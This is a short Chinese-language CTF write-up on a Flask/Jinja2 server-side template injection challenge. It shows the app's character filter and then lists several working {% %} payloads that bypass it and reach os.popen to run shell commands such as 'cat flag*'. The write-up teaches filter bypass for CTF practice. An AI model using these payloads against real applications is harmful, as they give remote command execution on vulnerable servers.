## 分析

这道题就是一个`python`的`SSTI`，不过过滤了`<>'"{{`这些符号

```python
def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect('/tmp/ninjas.db')
        db.isolation_level = None
        db.row_factory = sqlite3.Row
        db.text_factory = (lambda s: s.replace('{{', '').
            replace("'", '&#x27;').
            replace('"', '&quot;').
            replace('<', '&lt;').
            replace('>', '&gt;')
        )
    return db
```

所以这里我们需要用`{%%}`来解题


`payload` 如下
```python
name={% if session.update({request.args.key:self._TemplateReference__context.cycler.__init__.__globals__.os.popen(request.args.command).read()}) == 1 %}{% endif %}&key=leader&command=cat+flag*


name={%print%20session.update({dict(a=1)|list|last:1.__class__.__base__.__subclasses__()[-6].__init__.__globals__.os.popen(request.args.xxx).read()})%}&xxx=cat%20flag*

{%25+include+request.application.__globals__.__builtins__.__import__(request.args.os).popen(request.args.cmd).read()+%25}&os=os&cmd=cat+flag*   //这个会报错

name={%25include%201.__class__.__base__.__subclasses__()[-6].__init__.__globals__.os.popen(request.args.xxx).read()|string%25}&xxx=cat%20f*

{% if session.update({request.args.key:request.application.__globals__.__builtins__.__import__(request.args.os).popen(request.args.cmd).read()})==1 %}{%endif%}

```

# 参考链接

[https://lexsd6.github.io/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/](https://lexsd6.github.io/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/)

[https://lexsd6.github.io/2020/11/27/%E5%85%B3%E4%BA%8Ejinja%E7%89%B9%E6%80%A7%E5%AF%B9ssti%E7%9A%84bypass%E7%9A%84%E5%BD%B1%E5%93%8D/](https://lexsd6.github.io/2020/11/27/%E5%85%B3%E4%BA%8Ejinja%E7%89%B9%E6%80%A7%E5%AF%B9ssti%E7%9A%84bypass%E7%9A%84%E5%BD%B1%E5%93%8D/)
